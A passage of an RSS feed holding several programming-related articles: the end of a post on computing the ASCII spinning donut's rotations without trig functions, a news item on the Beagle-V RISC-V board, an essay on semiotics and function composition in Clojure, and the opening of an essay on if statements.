      #define R(t,x,y) f=x;x-=t*y\
   ;y+=t*f;f=(3-x*x-y*y)/2;x*=f;y*=f;
   =0,e=1,c=1,d=0,f,g,h,G,H,A,t,D;char
 b[1760];for(;;){memset(b,32,1760);g=0,
h=1;memset(z,0,7040);for(j=0;j&lt;90;j++){
G=0,H=1;for(i=0;i&lt;314;i++){A=h+2,D=1/(G*
A*a+g*e+5);t=G*A        *e-g*a;x=40+30*D
*(H*A*d-t*c);y=          12+15*D*(H*A*c+
t*d);o=x+80*y;N          =8*((g*a-G*h*e)
*d-G*h*a-g*e-H*h        *c);if(22&gt;y&amp;&amp;y&gt;
 0&amp;&amp;x&gt;0&amp;&amp;80&gt;x&amp;&amp;D&gt;z[o]){z[o]=D;b[o]=(N&gt;0
  ?N:0)[".,-~:;=!*#$@"];}R(.02,H,G);}R(
  .07,h,g);}for(k=0;1761&gt;k;k++)putchar
   (k%80?b[k]:10);R(.04,e,a);R(.02,d,
     c);usleep(15000);printf('\n'+(
        " donut.c! \x1b[23A"));}}
          /*no math lib needed
             .@a1k0n 2021.*/
</code></pre></div></div>

<p>It’s a little misshapen and still has comments at the bottom. I used the first
frame of its output as a template and there’s <em>slightly</em> less code than filled
pixels – oh well. Output is pretty much the same as before:</p>


<pre id="d"></pre>



<p>So, how do we get sines and cosines without using <code>sin</code> and <code>cos</code>? Well, the
code doesn’t really <em>need</em> sine and cosine <em>per se</em>; what it actually does is
rotate a point around the origin in two nested loops, and also rotate two
angles just for the animation. If you’ll recall from the other article, the
inner loop is just plotting dots in a circle, which goes around another, larger
circle. In each loop, the sine/cosine terms are just moving by a small, fixed
angle.</p>

<p>So we don’t need to track the <em>angle</em> at all, we only need to start at cos=1,
sin=0 and rotate a circle around the origin to generate all the sines and
cosines we need. We just have to repeatedly apply a fixed rotation matrix:</p>

\[\begin{bmatrix}
c' \\
s'
\end{bmatrix} = \begin{bmatrix}
\cos \theta &amp; -\sin \theta \\
\sin \theta &amp; \cos \theta
\end{bmatrix} \begin{bmatrix} c \\ s \end{bmatrix}\]

<p>So for example, if we were to use an angle of .02 radians in our inner loop, it would look something like:</p>
<div><div><pre><code><span>float</span> <span>c</span><span>=</span><span>1</span><span>,</span> <span>s</span><span>=</span><span>0</span><span>;</span>  <span>// c for cos, s for sin</span>
<span>for</span> <span>(</span><span>int</span> <span>i</span> <span>=</span> <span>0</span><span>;</span> <span>i</span> <span>&lt;</span> <span>314</span><span>;</span> <span>i</span><span>++</span><span>)</span> <span>{</span>  <span>// 314 * .02 ~= 2π</span>
  <span>// (use c, s in code)</span>
  <span>float</span> <span>newc</span> <span>=</span> <span>0</span><span>.</span><span>9998</span><span>*</span><span>c</span> <span>-</span> <span>0</span><span>.</span><span>01</span><span>9998666</span><span>*</span><span>s</span><span>;</span>
  <span>s</span> <span>=</span> <span>0</span><span>.</span><span>01</span><span>9998666</span><span>*</span><span>c</span> <span>+</span> <span>0</span><span>.</span><span>9998</span><span>*</span><span>s</span><span>;</span>
  <span>c</span> <span>=</span> <span>newc</span><span>;</span>
<span>}</span>
</code></pre></div></div>



<p>That works, but there’s a problem: no matter how precisely we define our
constants, after repeated iteration of this procedure, the magnitude of our \(\left(c, s\right)\) vector will exponentially grow or shrink over time. If we
only need to make one pass around the loop, maybe we can get away with that,
but if we have to make several (for the rotating animation, we do), we need to
fix that.</p>

<p><img src="https://www.a1k0n.net/img/sincos-mag.png" alt="sine and cosine magnitude creep"><br>
<em>an exaggerated illustration of what happens when repeatedly doing low-precision rotations</em></p>

<p>The simplest way to do that would be to multiply \(c\) and \(s\) by \(1/\sqrt{c^2 + s^2}\), but then we’re back to using the math library again. Instead, we can take
advantage of the fact that our magnitude starts out very close to 1, and we’re
going to be iterating this procedure: we can do a <a href="https://en.wikipedia.org/wiki/Newton%27s_method">Newton
step</a> after each rotation, and
that will be enough to keep the magnitude “close enough” to 1 over time.</p>

<p>Our goal is to find the reciprocal square root (<a href="https://en.wikipedia.org/wiki/Fast_inverse_square_root">sound
familiar?</a>) of \(a =
c^2 + s^2\), our \(\left(c, s\right)\) vector magnitude.  Say we define a
function \(f(x) = \frac{1}{x^2} - a\). The function is 0 when \(x =
\frac{1}{\sqrt{a}}\). We can start with an initial guess of 1 for <em>x</em>,
perform a Newton iteration to obtain <em>x’</em>, which will be “closer to”
\(\frac{1}{\sqrt{a}}\), the correct value to scale <em>c</em> and <em>s</em> by so that their
magnitude \(c^2 + s^2\) is “close to” 1 again.</p>

<p>A Newton step is defined as \(x' = x - \frac{f(x)}{f'(x)}\). I used
<a href="https://www.sympy.org/">SymPy</a> to do the derivative and simplification and
came up with \(x' = \frac{x\left(3 - a x^2\right)}{2}\). Since we’re only doing
one step, we can plug in our initial guess of 1 for \(x\) and back-substitute
\(c^2 + s^2\) for \(a\) to finally get our adjustment: \(x' = (3 - c^2 - s^2)/2\).</p>



<p>But now that we don’t have to worry so much about the magnitude of our result
(within limits), we can take another shortcut (I got this idea studying old
<a href="https://en.wikipedia.org/wiki/CORDIC">CORDIC</a> algorithms).  If we divide out
the cosines from our original rotation matrix, we get</p>

\[\begin{bmatrix}
c' \\
s'
\end{bmatrix} = \frac{1}{\cos \theta}\begin{bmatrix}
1 &amp; -\tan \theta \\
\tan \theta &amp; 1
\end{bmatrix} \begin{bmatrix} c \\ s \end{bmatrix}\]

<p>using the trig identity \(\tan \theta = \frac{\sin \theta}{\cos \theta}\).
Since we’re only dealing with small angles, the leading \(\frac{1}{\cos
\theta}\) term is close enough to 1 that we can ignore it and have our Newton
step take care of it.</p>

<p>And now we can finally understand how the rotation is done in the code. Towards
the top of the donut code is this #define, which I’ve reindented:</p>

<div><div><pre><code><span>#define R(t,x,y) \ 
</span>  <span>f</span> <span>=</span> <span>x</span><span>;</span> \
  <span>x</span> <span>-=</span> <span>t</span><span>*</span><span>y</span><span>;</span> \
  <span>y</span> <span>+=</span> <span>t</span><span>*</span><span>f</span><span>;</span> \
  <span>f</span> <span>=</span> <span>(</span><span>3</span><span>-</span><span>x</span><span>*</span><span>x</span><span>-</span><span>y</span><span>*</span><span>y</span><span>)</span><span>/</span><span>2</span><span>;</span> \
  <span>x</span> <span>*=</span> <span>f</span><span>;</span> \
  <span>y</span> <span>*=</span> <span>f</span><span>;</span>
</code></pre></div></div>

<p>This does an in-place rotation of a unit vector <code>x, y</code> where <code>t</code> is \(\tan
\theta\). <code>f</code> is a temporary variable; the first three lines do the “matrix
multiplication” on <code>x, y</code>. <code>f</code> is then re-used to get the magnitude adjustment,
and then finally <code>x</code> and <code>y</code> are multiplied by <code>f</code> which moves them back onto
the unit circle.</p>

<p>With that operation in hand, I just replaced all the angles with their sines
and cosines and ran the rotation operator <code>R()</code> instead of calling <code>sin</code>/<code>cos</code>.
The code is otherwise identical.</p>



<p>We can use exactly the same ideas with integer fixed-point arithmetic, and not
use any <code>float</code> math whatsoever. I’ve redone all the math with 10-bit precision
and produced the following C code which runs well on embedded devices which can
do 32-bit multiplications and have ~4k of available RAM:</p>

<div><div><pre><code><span>#include &lt;stdint.h&gt;
#include &lt;stdio.h&gt;
#include &lt;string.h&gt;
#include &lt;unistd.h&gt;
</span>
<span>#define R(mul,shift,x,y) \
  _=x; \
  x -= mul*y&gt;&gt;shift; \
  y += mul*_&gt;&gt;shift; \
  _ = 3145728-x*x-y*y&gt;&gt;11; \
  x = x*_&gt;&gt;10; \
  y = y*_&gt;&gt;10;
</span>
<span>int8_t</span> <span>b</span><span>[</span><span>1760</span><span>],</span> <span>z</span><span>[</span><span>1760</span><span>];</span>

<span>void</span> <span>main</span><span>()</span> <span>{</span>
  <span>int</span> <span>sA</span><span>=</span><span>1024</span><span>,</span><span>cA</span><span>=</span><span>0</span><span>,</span><span>sB</span><span>=</span><span>1024</span><span>,</span><span>cB</span><span>=</span><span>0</span><span>,</span><span>_</span><span>;</span>
  <span>for</span> <span>(;;)</span> <span>{</span>
    <span>memset</span><span>(</span><span>b</span><span>,</span> <span>32</span><span>,</span> <span>1760</span><span>);</span>  <span>// text buffer</span>
    <span>memset</span><span>(</span><span>z</span><span>,</span> <span>127</span><span>,</span> <span>1760</span><span>);</span>   <span>// z buffer</span>
    <span>int</span> <span>sj</span><span>=</span><span>0</span><span>,</span> <span>cj</span><span>=</span><span>1024</span><span>;</span>
    <span>for</span> <span>(</span><span>int</span> <span>j</span> <span>=</span> <span>0</span><span>;</span> <span>j</span> <span>&lt;</span> <span>90</span><span>;</span> <span>j</span><span>++</span><span>)</span> <span>{</span>
      <span>int</span> <span>si</span> <span>=</span> <span>0</span><span>,</span> <span>ci</span> <span>=</span> <span>1024</span><span>;</span>  <span>// sine and cosine of angle i</span>
      <span>for</span> <span>(</span><span>int</span> <span>i</span> <span>=</span> <span>0</span><span>;</span> <span>i</span> <span>&lt;</span> <span>324</span><span>;</span> <span>i</span><span>++</span><span>)</span> <span>{</span>
        <span>int</span> <span>R1</span> <span>=</span> <span>1</span><span>,</span> <span>R2</span> <span>=</span> <span>2048</span><span>,</span> <span>K2</span> <span>=</span> <span>5120</span><span>*</span><span>1024</span><span>;</span>

        <span>int</span> <span>x0</span> <span>=</span> <span>R1</span><span>*</span><span>cj</span> <span>+</span> <span>R2</span><span>,</span>
            <span>x1</span> <span>=</span> <span>ci</span><span>*</span><span>x0</span> <span>&gt;&gt;</span> <span>10</span><span>,</span>
            <span>x2</span> <span>=</span> <span>cA</span><span>*</span><span>sj</span> <span>&gt;&gt;</span> <span>10</span><span>,</span>
            <span>x3</span> <span>=</span> <span>si</span><span>*</span><span>x0</span> <span>&gt;&gt;</span> <span>10</span><span>,</span>
            <span>x4</span> <span>=</span> <span>R1</span><span>*</span><span>x2</span> <span>-</span> <span>(</span><span>sA</span><span>*</span><span>x3</span> <span>&gt;&gt;</span> <span>10</span><span>),</span>
            <span>x5</span> <span>=</span> <span>sA</span><span>*</span><span>sj</span> <span>&gt;&gt;</span> <span>10</span><span>,</span>
            <span>x6</span> <span>=</span> <span>K2</span> <span>+</span> <span>R1</span><span>*</span><span>1024</span><span>*</span><span>x5</span> <span>+</span> <span>cA</span><span>*</span><span>x3</span><span>,</span>
            <span>x7</span> <span>=</span> <span>cj</span><span>*</span><span>si</span> <span>&gt;&gt;</span> <span>10</span><span>,</span>
            <span>x</span> <span>=</span> <span>40</span> <span>+</span> <span>30</span><span>*</span><span>(</span><span>cB</span><span>*</span><span>x1</span> <span>-</span> <span>sB</span><span>*</span><span>x4</span><span>)</span><span>/</span><span>x6</span><span>,</span>
            <span>y</span> <span>=</span> <span>12</span> <span>+</span> <span>15</span><span>*</span><span>(</span><span>cB</span><span>*</span><span>x4</span> <span>+</span> <span>sB</span><span>*</span><span>x1</span><span>)</span><span>/</span><span>x6</span><span>,</span>
            <span>N</span> <span>=</span> <span>(</span><span>-</span><span>cA</span><span>*</span><span>x7</span> <span>-</span> <span>cB</span><span>*</span><span>((</span><span>-</span><span>sA</span><span>*</span><span>x7</span><span>&gt;&gt;</span><span>10</span><span>)</span> <span>+</span> <span>x2</span><span>)</span> <span>-</span> <span>ci</span><span>*</span><span>(</span><span>cj</span><span>*</span><span>sB</span> <span>&gt;&gt;</span> <span>10</span><span>)</span> <span>&gt;&gt;</span> <span>10</span><span>)</span> <span>-</span> <span>x5</span> <span>&gt;&gt;</span> <span>7</span><span>;</span>

        <span>int</span> <span>o</span> <span>=</span> <span>x</span> <span>+</span> <span>80</span> <span>*</span> <span>y</span><span>;</span>
        <span>int8_t</span> <span>zz</span> <span>=</span> <span>(</span><span>x6</span><span>-</span><span>K2</span><span>)</span><span>&gt;&gt;</span><span>15</span><span>;</span>
        <span>if</span> <span>(</span><span>22</span> <span>&gt;</span> <span>y</span> <span>&amp;&amp;</span> <span>y</span> <span>&gt;</span> <span>0</span> <span>&amp;&amp;</span> <span>x</span> <span>&gt;</span> <span>0</span> <span>&amp;&amp;</span> <span>80</span> <span>&gt;</span> <span>x</span> <span>&amp;&amp;</span> <span>zz</span> <span>&lt;</span> <span>z</span><span>[</span><span>o</span><span>])</span> <span>{</span>
          <span>z</span><span>[</span><span>o</span><span>]</span> <span>=</span> <span>zz</span><span>;</span>
          <span>b</span><span>[</span><span>o</span><span>]</span> <span>=</span> <span>".,-~:;=!*#$@"</span><span>[</span><span>N</span> <span>&gt;</span> <span>0</span> <span>?</span> <span>N</span> <span>:</span> <span>0</span><span>];</span>
        <span>}</span>
        <span>R</span><span>(</span><span>5</span><span>,</span> <span>8</span><span>,</span> <span>ci</span><span>,</span> <span>si</span><span>)</span>  <span>// rotate i</span>
      <span>}</span>
      <span>R</span><span>(</span><span>9</span><span>,</span> <span>7</span><span>,</span> <span>cj</span><span>,</span> <span>sj</span><span>)</span>  <span>// rotate j</span>
    <span>}</span>
    <span>for</span> <span>(</span><span>int</span> <span>k</span> <span>=</span> <span>0</span><span>;</span> <span>1761</span> <span>&gt;</span> <span>k</span><span>;</span> <span>k</span><span>++</span><span>)</span>
      <span>putchar</span><span>(</span><span>k</span> <span>%</span> <span>80</span> <span>?</span> <span>b</span><span>[</span><span>k</span><span>]</span> <span>:</span> <span>10</span><span>);</span>
    <span>R</span><span>(</span><span>5</span><span>,</span> <span>7</span><span>,</span> <span>cA</span><span>,</span> <span>sA</span><span>);</span>
    <span>R</span><span>(</span><span>5</span><span>,</span> <span>8</span><span>,</span> <span>cB</span><span>,</span> <span>sB</span><span>);</span>
    <span>usleep</span><span>(</span><span>15000</span><span>);</span>
    <span>printf</span><span>(</span><span>"</span><span>\x1b</span><span>[23A"</span><span>);</span>
  <span>}</span>
<span>}</span>
</code></pre></div></div>

<p>The output is pretty much the same.</p>

</article>







      </div>
    </div>
  </div></div>]]>
            </description>
            <link>https://www.a1k0n.net/2021/01/13/optimizing-donut.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25787545</guid>
            <pubDate>Fri, 15 Jan 2021 06:01:27 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[China tech firm releases the world’s first RISC-V PC]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25787428">thread link</a>) | @nullnilvoid
<br/>
January 14, 2021 | https://www.globaltimes.cn/page/202101/1212799.shtml | <a href="https://web.archive.org/web/*/https://www.globaltimes.cn/page/202101/1212799.shtml">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
          
          <p>China tech firm releases the world’s first RISC-V structured PC</p>
          
          
        </div><div>
          <div> <center><img src="https://www.globaltimes.cn/Portals/0/attachment/2020/2020-09-05/8519b914-ba14-4c7a-9bfd-401f47372e93.jpeg"></center>
<p>chip Photo:VCG</p><p>The world's first RISC-V single board PC Beagle-V based on Linux operation system was debuted by Shanghai tech firm StarFive on Wednesday. The computer was co-developed by StarFive, Shenzhen Seeed Studio and US SBC (single board computer) company Beagleboard, paper.com reported.&nbsp;</p><p>Beagle-V uses the domestic made SoC (system-on-a-chip) artificial intelligence vision processing chip by StarFive and can be used in areas of mechanical engineering, data center, artificial intelligence and cloud computing, said the report.&nbsp;</p><p>RISC stands for the Reduced Instruction Set Computer, which is a computer with a small, highly optimized set of instructions and with highly-improved operational efficiency. RISC-V is the fifth generation of the RISC.&nbsp;</p><p>Founder and CEO of StarFive Xu Taojin said that Beagle-V will meet industry requirements of demo board with high-performance, multifunction and low-cost. "Beagle-V has a small size of 85 millimeters multiple 70 milimeters and feature of energy saving, which is an ideal solution for single board computer," said Xu.</p><p>Geng Bo, deputy secretary-general of the China Solid State Lighting Alliance, told Global Times that RISC-V and ARM (Advanced RISC Machine) are two representative types of Reduced Instruction Set Computer invented in 1980s with most differences between two processors the design style and open source degree.&nbsp;</p><p>"Because ARM is not open source, the users of ARM have to adjust frequency and power dissipation of the products follow the original design of the ARM processor and to pay expensive license fee," said Geng.</p><p>Geng referred to the open source and zero license fees of RISC-V attracting more developers. "It's said that ARM had canceled license fees for the companies with financing amount lower than $5 million, to compete with its opponent RISC-V on the aspects of pricing," said Geng.</p><p>During the ceremony, officers of Shanghai government said the government will support the development of high technologies including RISC.</p><p>Beagle-V will start selling in March 2020 and will be opened to the broader market in the second half of 2021.&nbsp; </p></div>
        </div></div>]]>
            </description>
            <link>https://www.globaltimes.cn/page/202101/1212799.shtml</link>
            <guid isPermaLink="false">hacker-news-small-sites-25787428</guid>
            <pubDate>Fri, 15 Jan 2021 05:43:13 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Composition Is Interpretation]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25787141">thread link</a>) | @smlckz
<br/>
January 14, 2021 | https://ideolalia.com/essays/composition-is-interpretation.html | <a href="https://web.archive.org/web/*/https://ideolalia.com/essays/composition-is-interpretation.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>

	

	<div>
		<article>
			<p>Every useful process goes through at least one iteration of pulling data into scope, transforming the data, and pushing that data into another scope.<sup id="fnref:process" role="doc-noteref"><a href="#fn:process">1</a></sup>  Consider <code>grep</code>: it reads a line from <code>stdin</code>, examines the line to see if it should be forwarded to <code>stdout</code>, and repeats until <code>stdin</code> is exhausted.  Conversely, <code>cat</code> isn’t independently useful; it only exists to forward the filesystem into another process, which may simply be our terminal.</p>

<p>In almost every case, the transformation of a useful process is <strong>reductive</strong>; it emits less than it consumes.  When a process has a larger volume of output than input, it’s generally providing a different (and ostensibly more useful) representation of its input.  Examples of this include <code>gunzip</code> and a program which, given a seed value, emits a neverending stream of pseudorandom numbers; both are only useful when placed upstream of another process.</p>

<p>For sufficiently small inputs, this might be useful on its own.  We can uncompress a small gzipped file and read it in the terminal, or swap the delimiters in a small CSV file for HTML tags and look at it in the browser.  But few datasets are intrinsically small; if we’re able to take in our data at a glance today, we shouldn’t expect to be so lucky tomorrow.</p>

<p>This reduction of our input data isn’t arbitrary; we are distilling it down to its meaning, in context.  If we’re concerned on the errors in our logs, we lose nothing by filtering out everything else.  If we’re concerned with the number of errors day-over-day, we lose nothing by reducing each log file down to a single number.  This is the essence of <strong>interpretation</strong>, as defined within the field of <a href="https://en.wikipedia.org/wiki/Semiotics">semiotics</a>: the transformation of one <a href="https://en.wikipedia.org/wiki/Sign_(semiotics)">sign</a> to a related sign, which often exists within a different <a href="https://en.wikipedia.org/wiki/Sign_system">system</a> of signs.</p>

<p>Our colloquial understanding of interpretation captures most of this; we are assigning meaning to something.  This process is subjective, and largely arbitrary; we are free to assign whatever meaning we like.  There are often multiple useful interpretations, and we can consider them together to better understand what we’re interpreting.</p>

<p>Semiotics also tells us that each meaning is itself just another sign, which can be interpreted in turn.  This idea, called <em>unlimited semiosis</em> in modern semiotics, was considered very unintuitive when it was first suggested in the 19th century by Charles Peirce.  In the context of software, however, it’s self-evident: each function interprets its inputs, yielding a result that can be interpreted by other functions, and so on.  There is no obvious or necessary end to this process; at some point we simply share our results with the outside world, allowing someone else to continue the chain of interpretation.</p>

<p>Meaning is created by combining software and data.  Data, by itself, is inert.  Software, by itself, is only a method for interpretation.  Software interprets data, but the converse is also true.  Different inputs will take different paths, and yield different meanings; our software is interpreted by the data it’s given.</p>

<p>This inverted perspective is useful when we look at how pieces of software are combined to create a whole.  When one function calls another, it is interpreting the purpose of the function it calls.  It is assigning meaning, in context.</p>

<p>Consider this expression, which removes all the bad values from a sequence of values:<sup id="fnref:clojure" role="doc-noteref"><a href="#fn:clojure">2</a></sup></p>



<p>The <code>remove</code> function, on its own, is highly abstract; it treats all possible predicates and all possible sequences as interchangeable.  By calling it with a specific predicate, we have made it more concrete.  As we further compose upstream, and the meaning of <code>s</code> becomes more defined, so too does the meaning of our expression.  If we think <code>(remove bad? ...)</code> lends itself to multiple interpretations, by multiple sequences, we might even give it a name:</p>

<div><div><pre><code><span>(</span><span>def</span><span> </span><span>good</span><span> </span><span>(</span><span>partial</span><span> </span><span>remove</span><span> </span><span>bad?</span><span>))</span><span>
</span></code></pre></div></div>

<p>As we compose functions, our program’s interpretation of its input becomes increasingly abstract; by filtering out <code>bad?</code> values, we treat any interleaving of those values as if they were the same.</p>

<p>Not every function, however, makes an equal contribution to this growing abstraction; <code>remove</code> is just a different idiom for <code>filter</code>:</p>

<div><div><pre><code><span>(</span><span>defn</span><span> </span><span>remove</span><span> </span><span>[</span><span>predicate</span><span> </span><span>s</span><span>]</span><span>
  </span><span>(</span><span>filter</span><span>
    </span><span>(</span><span>complement</span><span> </span><span>predicate</span><span>)</span><span>
    </span><span>s</span><span>))</span><span>
</span></code></pre></div></div>

<p>Likewise, <code>complement</code> just negates a function’s return value, turning <code>false</code> to <code>true</code> and vice-versa.  These functions do not assign meaning, they attempt to preserve it in a different form.  Rather than interpreting, they are <strong>translating</strong>.</p>

<p>Of course, any semiotician will tell you that <a href="https://www.orionbooks.co.uk/titles/umberto-eco/mouse-or-rat/9781780226279/">translation isn’t easy</a>, and some meaning is invariably lost along the way.  But these strata in our codebases, which attempt to translate rather than interpret, are qualitatively different; they are what we call “glue code.”</p>

<p>This, however, only defers the act of interpretation to a higher strata.  Our code exists to be interpreted, either by data or by other code composed atop it.  We leave room for interpretation using two fundamental mechanisms: function references and conditional execution.</p>

<p>Both of these mechanisms allow a function’s inputs to influence its execution.  Consider this implementation of <code>filter</code>:</p>

<div><div><pre><code><span>(</span><span>defn</span><span> </span><span>filter</span><span> </span><span>[</span><span>predicate</span><span> </span><span>s</span><span>]</span><span>
  </span><span>(</span><span>cond</span><span>
    </span><span>(</span><span>empty?</span><span> </span><span>s</span><span>)</span><span> 
    </span><span>[]</span><span>
    
    </span><span>(</span><span>predicate</span><span> </span><span>(</span><span>first</span><span> </span><span>s</span><span>))</span><span> 
    </span><span>(</span><span>cons</span><span> 
      </span><span>(</span><span>first</span><span> </span><span>s</span><span>)</span><span> 
      </span><span>(</span><span>recur</span><span> </span><span>predicate</span><span> </span><span>(</span><span>rest</span><span> </span><span>s</span><span>))))</span><span>
      
    </span><span>:else</span><span>
    </span><span>(</span><span>recur</span><span> </span><span>predicate</span><span> </span><span>(</span><span>rest</span><span> </span><span>s</span><span>)))</span><span>
</span></code></pre></div></div>

<p>First we check if the sequence is empty; if so, we return an empty sequence.  If it isn’t empty, we check if the first element satisfies the <code>predicate</code>; if so, we prepend it onto the result of filtering the rest of the sequence.  Otherwise, we omit the element from our result.</p>

<p>The first clause is simple conditional execution; given an empty sequence, <code>filter</code> will short-circuit.  The second clause is both a function reference and conditional execution; <code>filter</code> will call whatever <code>predicate</code> we’ve provided, and use the returned result to choose one of two branches.</p>

<p>But these are implementation details; the person calling <code>filter</code> should be able to focus on its semantics, not the precise way it uses its inputs.  As implementors, first we decide what sorts of interpretations our function will allow, and then we determine what minimal set of inputs will allow those interpretations.</p>

<p>In the above implementation, for instance, we don’t wrap each recursion in Clojure’s <a href="http://clojure-doc.org/articles/language/laziness.html#benefits-of-lazy-sequences"><code>lazy-seq</code></a> macro, meaning the entire filtered sequence is eagerly computed.  If we had made it lazy, that would allow for the code atop <code>filter</code> to have more control over where and when each element of the inputs sequence is processed.  Alternately, if we wanted to remain eager, we could have exposed a way for the code invoking <code>filter</code> to control what sort of collection it constructed, rather than always returning a <code>cons</code>-based list.</p>

<p>A broader range of possible interpretations isn’t necessarily better; simplicity has its own benefits.  If we’re happy discarding our code tomorrow, we can focus entirely on our needs today.  If we want our code to survive a bit longer, however, or even be a general-purpose library, we need to be more expansive.</p>

<p>In general-purpose code, we should rely on function references wherever possible.  In addition to the first-class functions that are common in Clojure, these encompass any object instance with one or more associated methods.<sup id="fnref:closures" role="doc-noteref"><a href="#fn:closures">3</a></sup>. Function references provide an <strong>open</strong> mechanism for interpretation; to extend the set of possible interpretations, you just have to write your own function.</p>

<p>Conditional execution, conversely, is a <strong>closed</strong> mechanism; to extend the set of possible interpretations we need to edit a preexisting function.  In general-purpose code, this is almost always driven by some sort of open classifier function, which reduces all possible values down to a finite set of categories.  In Java, for instance, <code>equals</code>, <code>compareTo</code>, and <code>hashCode</code> reduce their inputs down to 2, 3, and 2<sup>32</sup> categories, respectively.</p>

<p>In some cases, general-purpose code may also have conditional execution based on internal datatypes.  The semantics of a red-black tree, for instance, are entirely driven by an externally provided ordering function, but its internal bookkeeping will have <a href="http://matt.might.net/papers/germane2014deletion.pdf">lots</a> of <code>if</code>s or <code>match</code>es dealing with red and black nodes.</p>

<p>If your code has conditional execution based on public datatypes, however, it’s not meant to be general purpose; it’s what we call “business logic.”  This is the upper strata of our application, interpreted by data rather than other code.  Here, the closed nature of conditional execution is useful; we can understand the meaning of a given input by looking at a single point in our codebase.  What endpoints does our API offer?  Just look at the file where all of the routes are defined.</p>

<p>Almost anyone who writes software for a living can tell the difference between glue code, library code, and business logic.  The first time we heard each term, it was fairly clear from context and the names themselves what was being described.  If someone doesn’t understand, we assume they’ll figure it out soon, just like we did.</p>

<p>We may have a solid <a href="https://en.wikipedia.org/wiki/Tacit_knowledge">tacit understanding</a> of these concepts, but would struggle to explain them, and how they relate to each other.  Semiotics seems to provide a framework that can formalize and correlate this knowledge.  Put another way, I believe every skilled software designer has an innate, mostly undeveloped talent for applied semiotics, and I’m curious what would happen if they tried to develop it.</p>

<p>Unfortunately, I don’t think simply reading <a href="https://iupress.org/9780253202178/a-theory-of-semiotics/">a seminal text on semiotics</a> will suffice; the interpretation done by software is vastly more reductive than that done by humans.  When we use the idea of library to denote a book, or vice-versa, the amount of detail in our mental conception changes very little, if at all.  In many contexts, they will have very similar connotations.  But in a computer, a library-sized dataset is not an abstract symbol of knowledge; it’s a library’s worth of data, which is not at all the same as …</p></article></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://ideolalia.com/essays/composition-is-interpretation.html">https://ideolalia.com/essays/composition-is-interpretation.html</a></em></p>]]>
            </description>
            <link>https://ideolalia.com/essays/composition-is-interpretation.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25787141</guid>
            <pubDate>Fri, 15 Jan 2021 04:51:08 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Structured programming: how to write proper if statements]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 1 (<a href="https://news.ycombinator.com/item?id=25786956">thread link</a>) | @harporoeder
<br/>
January 14, 2021 | http://boris-marinov.github.io/if/ | <a href="https://web.archive.org/web/*/http://boris-marinov.github.io/if/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
    <p>The <code>if</code> statement (or <code>if</code> expression) is the cornerstone of every modern programming language - it is so pervasive that we rarely think about how exactly should we use it, or how it is meant to be used. But despite its popularity, <code>if</code> wasnâ€™t always there, and it wasnâ€™t as pervasive as nowadays, so its role is, Iâ€™d argue, still somewhat misunderstood. So in this article, I will examine some mistakes that we can easily avoid in order to improve on our code.</p>

<!--more-->



<p>This is an opinionated text, i.e. it contains my opinions and although I have many arguments that back them, they are ultimately based on <em>my</em> core beliefs about what programming is and should be, so take them as advice, as opposed to a dogma. And here are some of the things on which this advice is based on, structured as postulates.</p>

<blockquote>
  <p>Code is for humans (and programmers are humans too).</p>
</blockquote>

<p>A form of this appears in a little book known in the hacker community as â€œSICPâ€�, but I donâ€™t know if they were the first to state it. It means that programs are not just instructions for performing a given task - they are text, and as such they should be subject to the same stylistical rules as other text is.</p>

<blockquote>
  <p>Code should be as bug-free as possible (and easy to debug as well).</p>
</blockquote>

<p>This one looks pretty self-explanatory, but the key point is that we have to dedicate effort to make it such, by constantly thinking not only about ways in which the code might go wrong, but also about ways to diagnose potential problems.</p>

<p>I guess I should say something about why I believe these things. Simple - because all other approaches just fail because of the human factor, e.g. any code, that is written without regard for style is bound to become legacy when the person who supports it leaves. Likewise, maintaining code that lacks structure results in bugs (which often can be fixed only by imposing more structure).</p>

<p>Lastly, people often contrast good structure and readability with speed. Firstly, the comparison is a bit unfair, because a well-structured is easier to optimize. And for cases in which it is really the case, in 99% the gain is so little that nobody cares, so the emphasis should remain on readability and structure even then. This is when I would throw this very famous quote by DEK:</p>

<blockquote>
  <p>Programmers waste enormous amounts of time thinking about, or worrying about, the speed of noncritical parts of their programs, and these attempts at efficiency actually have a strong negative impact when debugging and maintenance are considered. We should forget about small efficiencies, say about 97 % of the time: pre mature optimization is the root of all evil.
<a href="http://www.kohala.com/start/papers.others/knuth.dec74.html">source</a></p>
</blockquote>

<p>Keep in mind that he wrote this when computers were a thousand times slower than today, so we should care about maintainability even more.</p>



<p>Once upon a time, all there was was the assembly language where people didnâ€™t have brackets and had to use <code>jump</code> instructions instead. For those who donâ€™t know what jump does, if you imagine that somewhere in the virtual machine, or the interpreter, that runs your code there is a variable that denotes which line of code should be executed next, then <code>jump</code> is a functionality that basically allows you to set that variable to whatever value you please - it is like a portal that allows you to go to from any place of the program to any other place. For example, a typical <code>if</code> statement that looks like this when written with jumps:</p>

<div><div><pre><code>compare input to waterlevel
if less, jump to A
if equal, jump to B
jump to C

A:
turn motor on
jump to C

B:
turn motor off
C:
...
</code></pre></div></div>
<p><a href="https://stackoverflow.com/questions/40602029/how-to-write-if-else-in-assembly">Source for the assembly pseudocode</a></p>

